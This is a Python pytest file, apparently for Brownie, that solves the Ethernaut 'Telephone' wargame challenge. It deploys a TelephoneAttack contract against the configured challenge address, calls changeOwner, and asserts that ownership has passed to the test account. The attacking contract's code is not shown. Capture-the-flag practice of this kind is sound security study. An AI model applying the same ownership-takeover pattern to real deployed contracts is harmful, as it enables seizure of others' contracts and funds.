import pytest
from brownie import TelephoneAttack, Telephone, network, config, accounts, Contract

account = accounts.add(config["wallets"]["from_key"])


def get_ethernaut_contract():
    contract = Contract.from_abi(
        Telephone._name, config["networks"][network.show_active(
        )]["contract_addr"], Telephone.abi
    )

    return contract


def test_attack_telephone():
    tel = TelephoneAttack.deploy(
        config["networks"][network.show_active()]["contract_addr"], {"from": account})

    tel.changeOwner({"from": account})
    assert get_ethernaut_contract().owner() == account
